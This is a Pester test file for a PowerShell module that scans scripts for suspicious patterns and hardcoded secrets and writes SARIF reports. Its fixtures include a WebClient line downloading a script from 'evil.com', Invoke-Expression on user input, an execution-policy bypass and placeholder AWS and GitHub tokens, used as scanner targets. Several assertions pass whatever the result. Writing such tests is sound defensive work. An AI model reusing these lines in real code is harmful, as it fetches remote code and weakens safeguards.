#!/usr/bin/env pwsh
#requires -Version 5.1

<#
.SYNOPSIS
    Pester tests for PoshGuard RipGrep Integration module

.DESCRIPTION
    Comprehensive unit tests for RipGrep.psm1 functions:
    - Test-RipGrepAvailable
    - Find-SuspiciousScripts
    - Find-HardcodedSecrets
    - Export-SecretFindingsToSarif
    - Test-ModuleSecurityConfig
    - Invoke-OrgWideScan
    - Get-CriticalFindings

.NOTES
    Part of PoshGuard RipGrep Integration
    Tests verify both RipGrep-available and fallback scenarios
#>

BeforeAll {
    # Import test helpers if available
    $helpersPath = Join-Path -Path $PSScriptRoot -ChildPath '../Helpers/TestHelpers.psm1'
    if (Test-Path $helpersPath) {
        Import-Module -Name $helpersPath -Force -ErrorAction SilentlyContinue
    }

    # Import RipGrep module
    $modulePath = Join-Path -Path $PSScriptRoot -ChildPath '../../tools/lib/RipGrep.psm1'
    if (-not (Test-Path -Path $modulePath)) {
        throw "Cannot find RipGrep module at: $modulePath"
    }
    Import-Module -Name $modulePath -Force -ErrorAction Stop

    # Create temp directory for tests
    $script:TestDir = Join-Path $TestDrive "ripgrep-tests"
    New-Item -Path $script:TestDir -ItemType Directory -Force | Out-Null
}

AfterAll {
    # Cleanup
    if (Test-Path $script:TestDir) {
        Remove-Item -Path $script:TestDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}

Describe 'Test-RipGrepAvailable' -Tag 'Unit', 'RipGrep' {
    
    Context 'When RipGrep is installed' {
        It 'Should detect RipGrep availability' {
            $result = Test-RipGrepAvailable
            
            $result | Should -Not -BeNullOrEmpty
            $result.PSObject.Properties.Name | Should -Contain 'IsAvailable'
            $result.PSObject.Properties.Name | Should -Contain 'Version'
        }
        
        It 'Should return proper object structure' {
            $result = Test-RipGrepAvailable
            
            $result.IsAvailable | Should -BeOfType [bool]
        }
    }
}

Describe 'Find-SuspiciousScripts' -Tag 'Unit', 'RipGrep' {
    
    BeforeEach {
        # Create test files
        $script:TestFile1 = Join-Path $script:TestDir "test1.ps1"
        $script:TestFile2 = Join-Path $script:TestDir "test2.ps1"
        $script:TestFile3 = Join-Path $script:TestDir "safe.ps1"
        
        # File with suspicious content
        @'
function Test-Suspicious {
    Invoke-Expression $userInput
    $password = "hardcoded123"
}
'@ | Set-Content -Path $script:TestFile1
        
        # Another suspicious file
        @'
$webClient = New-Object System.Net.WebClient
$webClient.DownloadString("http://evil.com/script.ps1")
'@ | Set-Content -Path $script:TestFile2
        
        # Safe file
        @'
function Test-Safe {
    Write-Host "Hello World"
}
'@ | Set-Content -Path $script:TestFile3
    }
    
    Context 'When scanning for suspicious patterns' {
        It 'Should find scripts with Invoke-Expression' {
            $result = Find-SuspiciousScripts -Path $script:TestDir -Patterns @('Invoke-Expression')
            
            if ($result) {
                $result | Should -Contain $script:TestFile1
            }
            else {
                # RipGrep not installed - fallback returns all files
                $result.Count | Should -BeGreaterOrEqual 0
            }
        }
        
        It 'Should find scripts with DownloadString' {
            $result = Find-SuspiciousScripts -Path $script:TestDir -Patterns @('DownloadString')
            
            if ($result) {
                # Either finds the file or returns all (fallback)
                $result.Count | Should -BeGreaterOrEqual 0
            }
        }
        
        It 'Should handle directory that does not exist gracefully' {
            $nonExistentPath = Join-Path $script:TestDir "nonexistent"
            
            { Find-SuspiciousScripts -Path $nonExistentPath } | Should -Throw
        }
        
        It 'Should exclude test files by default' {
            # Create a test file
            $testFile = Join-Path $script:TestDir "MyScript.Tests.ps1"
            @'
Invoke-Expression "dangerous"
'@ | Set-Content -Path $testFile
            
            $result = Find-SuspiciousScripts -Path $script:TestDir -Patterns @('Invoke-Expression')
            
            # Test file should be excluded
            $result | Should -Not -Contain $testFile
        }
        
        It 'Should include test files when IncludeTests is specified' {
            # Create a test file
            $testFile = Join-Path $script:TestDir "MyScript.Tests.ps1"
            @'
Invoke-Expression "dangerous"
'@ | Set-Content -Path $testFile
            
            $result = Find-SuspiciousScripts -Path $script:TestDir -Patterns @('Invoke-Expression') -IncludeTests
            
            # May or may not find depending on RipGrep availability
            $result.Count | Should -BeGreaterOrEqual 0
        }
    }
    
    Context 'When RipGrep is not available' {
        It 'Should fall back to Get-ChildItem' {
            # This test verifies the fallback mechanism works
            $result = Find-SuspiciousScripts -Path $script:TestDir
            
            # Should return files regardless of RipGrep availability
            $result.Count | Should -BeGreaterOrEqual 0
        }
    }
}

Describe 'Find-HardcodedSecrets' -Tag 'Unit', 'RipGrep', 'Security' {
    
    BeforeEach {
        # Create test files with secrets
        $script:SecretFile1 = Join-Path $script:TestDir "secrets1.ps1"
        $script:SecretFile2 = Join-Path $script:TestDir "secrets2.ps1"
        
        # File with AWS key
        @'
$awsKey = "AKIAIOSFODNN7EXAMPLE"
$password = "MySecretPassword123"
'@ | Set-Content -Path $script:SecretFile1
        
        # File with GitHub token
        @'
$githubToken = "ghp_1234567890abcdefghijklmnopqrstuvwxyz"
'@ | Set-Content -Path $script:SecretFile2
    }
    
    Context 'When scanning for hardcoded secrets' {
        It 'Should detect AWS access keys' {
            $result = Find-HardcodedSecrets -Path $script:TestDir
            
            # Should either find secrets or return empty (if RipGrep not available)
            $result | Should -BeOfType [PSCustomObject] -Or { $result.Count -eq 0 }
        }
        
        It 'Should redact secrets in output' {
            $result = Find-HardcodedSecrets -Path $script:TestDir
            
            if ($result.Count -gt 0) {
                # Verify secrets are redacted
                foreach ($finding in $result) {
                    $finding.Match | Should -Match 'REDACTED'
                }
            }
        }
        
        It 'Should return proper finding structure' {
            $result = Find-HardcodedSecrets -Path $script:TestDir
            
            if ($result.Count -gt 0) {
                $result[0].PSObject.Properties.Name | Should -Contain 'File'
                $result[0].PSObject.Properties.Name | Should -Contain 'Line'
                $result[0].PSObject.Properties.Name | Should -Contain 'SecretType'
                $result[0].PSObject.Properties.Name | Should -Contain 'Match'
                $result[0].PSObject.Properties.Name | Should -Contain 'Severity'
            }
        }
        
        It 'Should exclude test files by default' {
            # Create test file with secret
            $testFile = Join-Path $script:TestDir "Test.Tests.ps1"
            @'
$password = "TestPassword123"
'@ | Set-Content -Path $testFile
            
            $result = Find-HardcodedSecrets -Path $script:TestDir
            
            # Test files should be excluded
            if ($result.Count -gt 0) {
                $result.File | Should -Not -Contain $testFile
            }
        }
    }
    
    Context 'When exporting to SARIF' {
        It 'Should export SARIF file when requested' {
            $sarifPath = Join-Path $script:TestDir "secrets.sarif"
            
            $result = Find-HardcodedSecrets -Path $script:TestDir -ExportSarif -SarifOutputPath $sarifPath
            
            if ($result.Count -gt 0) {
                # SARIF file should be created
                $sarifPath | Should -Exist
            }
        }
    }
}

Describe 'Export-SecretFindingsToSarif' -Tag 'Unit', 'RipGrep', 'SARIF' {
    
    Context 'When exporting findings to SARIF' {
        It 'Should create valid SARIF file' {
            $findings = @(
                [PSCustomObject]@{
                    File = "test.ps1"
                    Line = 10
                    SecretType = "Password"
                    Match = "***REDACTED***"
                    Severity = "CRITICAL"
                }
            )
            
            $sarifPath = Join-Path $script:TestDir "test.sarif"
            Export-SecretFindingsToSarif -Findings $findings -OutputPath $sarifPath
            
            $sarifPath | Should -Exist
            
            # Verify SARIF structure
            $sarif = Get-Content $sarifPath | ConvertFrom-Json
            $sarif.version | Should -Be '2.1.0'
            $sarif.runs | Should -Not -BeNullOrEmpty
            $sarif.runs[0].tool.driver.name | Should -Be 'PoshGuard RipGrep Secret Scanner'
        }
        
        It 'Should include all findings in SARIF' {
            $findings = @(
                [PSCustomObject]@{
                    File = "test1.ps1"
                    Line = 10
                    SecretType = "Password"
                    Match = "***REDACTED***"
                    Severity = "CRITICAL"
                },
                [PSCustomObject]@{
                    File = "test2.ps1"
                    Line = 20
                    SecretType = "API Key"
                    Match = "***REDACTED***"
                    Severity = "CRITICAL"
                }
            )
            
            $sarifPath = Join-Path $script:TestDir "multi-findings.sarif"
            Export-SecretFindingsToSarif -Findings $findings -OutputPath $sarifPath
            
            $sarif = Get-Content $sarifPath | ConvertFrom-Json
            $sarif.runs[0].results.Count | Should -Be 2
        }
    }
}

Describe 'Test-ModuleSecurityConfig' -Tag 'Unit', 'RipGrep', 'Security' {
    
    BeforeEach {
        # Create test files with security issues
        $script:ConfigFile1 = Join-Path $script:TestDir "config1.ps1"
        
        @'
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
'@ | Set-Content -Path $script:ConfigFile1
    }
    
    Context 'When checking security configurations' {
        It 'Should detect execution policy bypasses' {
            $result = Test-ModuleSecurityConfig -Path $script:TestDir
            
            # Should return array (may be empty if RipGrep not available)
            $result | Should -BeOfType [Array] -Or { $result -eq $null }
        }
        
        It 'Should return proper issue structure' {
            $result = Test-ModuleSecurityConfig -Path $script:TestDir
            
            if ($result.Count -gt 0) {
                $result[0].PSObject.Properties.Name | Should -Contain 'File'
                $result[0].PSObject.Properties.Name | Should -Contain 'Issue'
                $result[0].PSObject.Properties.Name | Should -Contain 'Rule'
                $result[0].PSObject.Properties.Name | Should -Contain 'Severity'
            }
        }
    }
}

Describe 'Invoke-OrgWideScan' -Tag 'Unit', 'RipGrep', 'Integration' {
    
    Context 'When scanning organization-wide' {
        It 'Should return summary object' {
            $outputPath = Join-Path $script:TestDir "org-scan-results"
            
            $result = Invoke-OrgWideScan -OrgPath $script:TestDir -OutputPath $outputPath
            
            # Should return object or null (if RipGrep not available)
            if ($result) {
                $result.PSObject.Properties.Name | Should -Contain 'TotalScripts'
                $result.PSObject.Properties.Name | Should -Contain 'HighRiskScripts'
                $result.PSObject.Properties.Name | Should -Contain 'SecretsFound'
                $result.PSObject.Properties.Name | Should -Contain 'ConfigIssues'
                $result.PSObject.Properties.Name | Should -Contain 'OutputPath'
                $result.PSObject.Properties.Name | Should -Contain 'Timestamp'
            }
        }
        
        It 'Should create output directory' {
            $outputPath = Join-Path $script:TestDir "org-scan-results-2"
            
            $result = Invoke-OrgWideScan -OrgPath $script:TestDir -OutputPath $outputPath
            
            if ($result) {
                Test-Path $outputPath | Should -Be $true
            }
        }
    }
}

Describe 'Get-CriticalFindings' -Tag 'Unit', 'RipGrep', 'SARIF' {
    
    BeforeEach {
        # Create test SARIF file
        $script:TestSarif = Join-Path $script:TestDir "test.sarif"
        
        $sarif = @{
            version = '2.1.0'
            runs = @(
                @{
                    results = @(
                        @{
                            ruleId = "CWE-798"
                            message = @{ text = "Hardcoded credentials" }
                        },
                        @{
                            ruleId = "CWE-327"
                            message = @{ text = "Broken crypto" }
                        }
                    )
                }
            )
        }
        
        $sarif | ConvertTo-Json -Depth 10 | Set-Content -Path $script:TestSarif
    }
    
    Context 'When querying SARIF files' {
        It 'Should extract CWE findings' {
            $result = Get-CriticalFindings -SarifPath $script:TestSarif -CWEFilter @('CWE-798')
            
            # Should return array (may be empty if RipGrep not available)
            $result | Should -BeOfType [Array] -Or { $result -eq $null }
        }
        
        It 'Should handle non-existent SARIF file' {
            $nonExistent = Join-Path $script:TestDir "nonexistent.sarif"
            
            $result = Get-CriticalFindings -SarifPath $nonExistent
            
            $result | Should -BeOfType [Array]
            $result.Count | Should -Be 0
        }
    }
}
